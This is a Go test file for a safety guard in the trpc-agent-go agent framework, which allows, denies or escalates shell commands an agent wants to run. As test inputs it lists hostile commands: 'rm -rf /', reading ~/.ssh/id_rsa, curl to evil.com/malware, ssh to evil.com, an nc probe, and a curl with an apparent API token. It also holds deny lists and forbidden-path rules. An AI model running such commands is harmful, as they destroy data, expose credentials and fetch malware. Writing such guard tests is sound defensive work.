//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func createTestReq(toolName, cmd string) *tool.PermissionRequest {
	args, _ := json.Marshal(map[string]interface{}{
		"command": cmd,
	})
	return &tool.PermissionRequest{
		ToolName:   toolName,
		ToolCallID: "call_123",
		Arguments:  args,
	}
}

func TestSafetyGuard_12Scenarios(t *testing.T) {
	tmpDir := t.TempDir()
	policyFile := filepath.Join(tmpDir, "test_policy.yaml")
	reportFile := filepath.Join(tmpDir, "tool_safety_report.json")
	auditFile := filepath.Join(tmpDir, "tool_safety_audit.jsonl")

	policyContent := `
allowed_commands:
  - go
  - git
  - echo
  - ls
  - grep
  - cat
  - curl
  - npm
  - sleep
  - top
denied_commands:
  - rm
  - dd
  - mkfs
  - sudo
  - su
forbidden_paths:
  - "~/.ssh"
  - "/etc"
  - "*.env"
  - "*.pem"
  - "*.key"
network_whitelist:
  - "github.com"
  - "api.github.com"
  - "golang.org"
ask_rules:
  - "npm install"
  - "pip install"
  - "apt install"
  - "go install"
`
	require.NoError(t, os.WriteFile(policyFile, []byte(policyContent), 0644))

	auditLogger, err := NewFileAuditLogger(auditFile)
	require.NoError(t, err)
	defer auditLogger.Close()

	guard := NewGuard(
		WithPolicyFile(policyFile),
		WithAuditLogger(auditLogger),
		WithReportPath(reportFile),
	)

	ctx := context.Background()

	tests := []struct {
		name          string
		cmd           string
		toolName      string
		wantAction    tool.PermissionAction
		wantRuleID    string
		wantRiskLevel RiskLevel
		wantBlocked   bool
	}{
		{
			name:          "1. Safe go test command",
			cmd:           "go test ./...",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAllow,
			wantRuleID:    "RULE_ALLOW_PASSED",
			wantRiskLevel: RiskLevelNone,
			wantBlocked:   false,
		},
		{
			name:          "2. Dangerous deletion rm -rf",
			cmd:           "rm -rf /",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_DENIED_COMMAND",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "3. Read secret key or .env",
			cmd:           "cat ~/.ssh/id_rsa",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_FORBIDDEN_PATH",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "4. Non-whitelisted network outbound",
			cmd:           "curl https://evil.com/malware",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_NETWORK_NON_WHITELIST",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "5. Whitelisted network request",
			cmd:           "curl https://api.github.com/zen",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAllow,
			wantRuleID:    "RULE_ALLOW_PASSED",
			wantRiskLevel: RiskLevelNone,
			wantBlocked:   false,
		},
		{
			name:          "6. Shell wrapper bypass sh -c",
			cmd:           "sh -c 'curl https://api.github.com/zen'",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_DENIED_COMMAND",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "7. Pipe command cat | grep",
			cmd:           "cat README.md | grep test",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAllow,
			wantRuleID:    "RULE_ALLOW_PASSED",
			wantRiskLevel: RiskLevelNone,
			wantBlocked:   false,
		},
		{
			name:          "8. Dependency installation npm install",
			cmd:           "npm install express",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAsk,
			wantRuleID:    "RULE_REQUIRES_HUMAN_APPROVAL",
			wantRiskLevel: RiskLevelMedium,
			wantBlocked:   false,
		},
		{
			name:          "9. Long time sleep 3600",
			cmd:           "sleep 3600",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_EXCESSIVE_SLEEP",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "10. Infinite loop / resource abuse",
			cmd:           "while true; do echo loop; done",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_INFINITE_LOOP",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "11. hostexec long session risk top",
			cmd:           "top",
			toolName:      "hostexec",
			wantAction:    tool.PermissionActionAsk,
			wantRuleID:    "RULE_HOSTEXEC_LONG_SESSION",
			wantRiskLevel: RiskLevelMedium,
			wantBlocked:   false,
		},
		{
			name:          "12. Human review ask scenario go install",
			cmd:           "go install github.com/some/tool@latest",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAsk,
			wantRuleID:    "RULE_REQUIRES_HUMAN_APPROVAL",
			wantRiskLevel: RiskLevelMedium,
			wantBlocked:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := createTestReq(tt.toolName, tt.cmd)
			decision, err := guard.CheckToolPermission(ctx, req)
			require.NoError(t, err)

			assert.Equal(t, tt.wantAction, decision.Action)

			report := guard.LastReport()
			require.NotNil(t, report)
			assert.Equal(t, tt.wantRuleID, report.RuleID)
			assert.Equal(t, tt.wantRiskLevel, report.RiskLevel)
			assert.Equal(t, tt.wantBlocked, report.IsBlocked)
			assert.NotEmpty(t, report.Evidence)
			assert.NotEmpty(t, report.Recommendation)
		})
	}

	// Verify report file was created
	_, err = os.Stat(reportFile)
	assert.NoError(t, err)

	// Verify audit.jsonl content
	auditBytes, err := os.ReadFile(auditFile)
	require.NoError(t, err)
	lines := bytes.Split(bytes.TrimSpace(auditBytes), []byte("\n"))
	assert.Len(t, lines, len(tests))
}

func TestSafetyGuard_Performance500Samples(t *testing.T) {
	guard := NewGuard()
	req := createTestReq("workspace_exec", "echo hello_world")
	ctx := context.Background()

	// Verify correctness across 500 invocations without a machine-specific
	// wall-clock assertion. Throughput is measured by BenchmarkSafetyGuard.
	for i := 0; i < 500; i++ {
		decision, err := guard.CheckToolPermission(ctx, req)
		require.NoError(t, err)
		assert.Equal(t, tool.PermissionActionAllow, decision.Action)
	}
}

// BenchmarkSafetyGuard measures repeated CheckToolPermission throughput.
func BenchmarkSafetyGuard(b *testing.B) {
	guard := NewGuard()
	req := createTestReq("workspace_exec", "echo hello_world")
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = guard.CheckToolPermission(ctx, req)
	}
}

func TestSafetyGuard_SecretLeakage(t *testing.T) {
	guard := NewGuard()
	ctx := context.Background()

	req := createTestReq("workspace_exec", "curl -H 'Authorization: Bearer sk-78c331e8061c42a4883cfee6633447dd' https://api.openai.com/v1")
	decision, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	report := guard.LastReport()
	assert.Equal(t, "RULE_SECRET_LEAKAGE", report.RuleID)
	assert.Equal(t, RiskLevelCritical, report.RiskLevel)
}

func TestSafetyGuard_InitErrAndDuration(t *testing.T) {
	ctx := context.Background()

	// Test InitErr when policy file doesn't exist
	invalidGuard := NewGuard(WithPolicyFile("non_existent_file.yaml"))
	assert.Error(t, invalidGuard.InitErr())

	// Test sleep 1h parsing in checkResourceAbuse
	guard := NewGuard()
	req := createTestReq("workspace_exec", "sleep 1h")
	decision, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	assert.Equal(t, "RULE_EXCESSIVE_SLEEP", guard.LastReport().RuleID)
}

func TestAuditLogger_NewAuditLogger(t *testing.T) {
	var buf bytes.Buffer
	logger := NewAuditLogger(&buf)
	require.NotNil(t, logger)

	event := AuditEvent{
		ToolName:  "workspace_exec",
		Decision:  tool.PermissionActionAllow,
		RiskLevel: RiskLevelNone,
		RuleID:    "RULE_ALLOW_PASSED",
	}
	require.NoError(t, logger.Log(event))
	assert.Contains(t, buf.String(), "RULE_ALLOW_PASSED")

	// Close on a non-file logger should return nil
	require.NoError(t, logger.Close())

	// nil logger should be safe
	var nilLogger *AuditLogger
	require.NoError(t, nilLogger.Log(event))
	require.NoError(t, nilLogger.Close())
}

func TestWithPolicy(t *testing.T) {
	ctx := context.Background()

	// Custom policy: only "forbidden_cmd" is denied.
	p := DefaultPolicy()
	p.DeniedCommands = []string{"forbidden_cmd"}
	p.NetworkWhitelist = []string{"github.com"}
	guard := NewGuard(WithPolicy(p))
	require.NotNil(t, guard)

	// The custom policy should deny forbidden_cmd.
	decision, err := guard.CheckToolPermission(ctx, createTestReq("workspace_exec", "forbidden_cmd arg1"))
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)

	// The custom policy should allow an otherwise-safe command.
	decision, err = guard.CheckToolPermission(ctx, createTestReq("workspace_exec", "echo hello"))
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionAllow, decision.Action)

	// WithPolicy(nil) should not overwrite the default; rm is still denied.
	guard2 := NewGuard(WithPolicy(nil))
	require.NotNil(t, guard2)
	decision, err = guard2.CheckToolPermission(ctx, createTestReq("workspace_exec", "rm -rf /"))
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
}

func TestLoadPolicyJSON(t *testing.T) {
	jsonData := `{"denied_commands":["rm"],"forbidden_paths":["~/.ssh"]}`
	p, err := LoadPolicyJSON([]byte(jsonData))
	require.NoError(t, err)
	assert.Contains(t, p.DeniedCommands, "rm")

	// Invalid JSON
	_, err = LoadPolicyJSON([]byte("not-json"))
	assert.Error(t, err)
}

func TestLoadPolicyFile_JSONAndUnknownExt(t *testing.T) {
	tmpDir := t.TempDir()

	// JSON file
	jsonFile := filepath.Join(tmpDir, "policy.json")
	jsonContent := `{"denied_commands":["dd"]}`
	require.NoError(t, os.WriteFile(jsonFile, []byte(jsonContent), 0600))
	p, err := LoadPolicyFile(jsonFile)
	require.NoError(t, err)
	assert.Contains(t, p.DeniedCommands, "dd")

	// Unknown extension, valid JSON
	unknownFile := filepath.Join(tmpDir, "policy.cfg")
	require.NoError(t, os.WriteFile(unknownFile, []byte(jsonContent), 0600))
	p2, err := LoadPolicyFile(unknownFile)
	require.NoError(t, err)
	assert.Contains(t, p2.DeniedCommands, "dd")

	// Unknown extension, invalid JSON and invalid YAML
	badFile := filepath.Join(tmpDir, "bad.cfg")
	require.NoError(t, os.WriteFile(badFile, []byte("{ bad json\x00"), 0600))
	_, err = LoadPolicyFile(badFile)
	assert.Error(t, err)

	// Non-existent file
	_, err = LoadPolicyFile(filepath.Join(tmpDir, "missing.json"))
	assert.Error(t, err)
}

func TestReportSaveJSON(t *testing.T) {
	tmpDir := t.TempDir()
	reportPath := filepath.Join(tmpDir, "report.json")

	r := &Report{
		ToolName:  "workspace_exec",
		Command:   "echo hi",
		Decision:  tool.PermissionActionAllow,
		RiskLevel: RiskLevelNone,
		RuleID:    "RULE_ALLOW_PASSED",
	}
	require.NoError(t, r.SaveJSON(reportPath))

	data, err := os.ReadFile(reportPath)
	require.NoError(t, err)
	assert.Contains(t, string(data), "RULE_ALLOW_PASSED")

	// Unwritable path should return error
	err = r.SaveJSON(filepath.Join(tmpDir, "nonexistent_dir", "report.json"))
	assert.Error(t, err)
}

func TestExtractScanRequest_Variants(t *testing.T) {
	guard := NewGuard()
	ctx := context.Background()

	// hostexec / host_exec backend
	for _, toolName := range []string{"hostexec", "host_exec"} {
		args, _ := json.Marshal(map[string]interface{}{"command": "echo hi"})
		req := &tool.PermissionRequest{ToolName: toolName, Arguments: args}
		_, err := guard.CheckToolPermission(ctx, req)
		require.NoError(t, err)
	}

	// codeexec / code_exec backend
	for _, toolName := range []string{"codeexec", "code_exec"} {
		args, _ := json.Marshal(map[string]interface{}{"script": "print('hi')"})
		req := &tool.PermissionRequest{ToolName: toolName, Arguments: args}
		_, err := guard.CheckToolPermission(ctx, req)
		require.NoError(t, err)
	}

	// cmd field
	args, _ := json.Marshal(map[string]interface{}{"cmd": "echo hello"})
	req := &tool.PermissionRequest{ToolName: "workspace_exec", Arguments: args}
	_, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	// code field
	args, _ = json.Marshal(map[string]interface{}{"code": "print('hello')"})
	req = &tool.PermissionRequest{ToolName: "workspace_exec", Arguments: args}
	_, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	// args, cwd, env fields
	args, _ = json.Marshal(map[string]interface{}{
		"command": "go test",
		"args":    []interface{}{"./..."},
		"cwd":     "/workspace",
		"env":     map[string]interface{}{"GOPATH": "/go"},
	})
	req = &tool.PermissionRequest{ToolName: "workspace_exec", Arguments: args}
	_, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	// Empty arguments
	req = &tool.PermissionRequest{ToolName: "workspace_exec", Arguments: nil}
	_, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	// Non-JSON raw arguments
	req = &tool.PermissionRequest{ToolName: "workspace_exec", Arguments: []byte("echo raw")}
	_, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	// JSON with no command fields — falls back to raw arguments
	args, _ = json.Marshal(map[string]interface{}{"other": "value"})
	req = &tool.PermissionRequest{ToolName: "workspace_exec", Arguments: args}
	_, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
}

func TestCheckDomainInArgs_AllWhitelisted(t *testing.T) {
	// checkDomainInArgs is called when a net tool (curl/wget/nc/ssh) is used
	// without an explicit HTTP URL — e.g. "ssh github.com" or "nc github.com 443".
	guard := NewGuard()
	ctx := context.Background()

	// Whitelisted domain via ssh — should be allowed
	req := createTestReq("workspace_exec", "ssh github.com")
	decision, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionAllow, decision.Action)

	// Non-whitelisted domain via ssh — should be denied
	req = createTestReq("workspace_exec", "ssh evil.com")
	decision, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	assert.Equal(t, "RULE_NETWORK_NON_WHITELIST", guard.LastReport().RuleID)

	// nc with no domain-like word — denied (no whitelisted domain found)
	req = createTestReq("workspace_exec", "nc -z 192.168.1.1 80")
	decision, err = guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
}

func TestResourceAbuse_SleepVariants(t *testing.T) {
	guard := NewGuard()
	ctx := context.Background()

	cases := []struct {
		cmd     string
		blocked bool
	}{
		{"sleep 10m", true},         // 600s > 300s
		{"sleep 2d", true},           // 2 days
		{"sleep 60", false},          // 60s <= 300s, allowed
		{"sleep abc", false},         // unparseable suffix: no duration match, not blocked by design
		{"for ((;;)) echo x", true},  // infinite loop
	}

	for _, c := range cases {
		req := createTestReq("workspace_exec", c.cmd)
		decision, err := guard.CheckToolPermission(ctx, req)
		require.NoError(t, err)
		if c.blocked {
			assert.Equal(t, tool.PermissionActionDeny, decision.Action, "cmd=%q should be denied", c.cmd)
		} else {
			assert.NotEqual(t, tool.PermissionActionDeny, decision.Action, "cmd=%q should not be denied", c.cmd)
		}
	}
}

func TestCheckHostExecBackground(t *testing.T) {
	guard := NewGuard()
	ctx := context.Background()

	// Background process should be denied
	args, _ := json.Marshal(map[string]interface{}{"command": "sleep 10 &"})
	req := &tool.PermissionRequest{ToolName: "hostexec", Arguments: args}
	decision, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	assert.Equal(t, "RULE_BACKGROUND_PROCESS", guard.LastReport().RuleID)
}
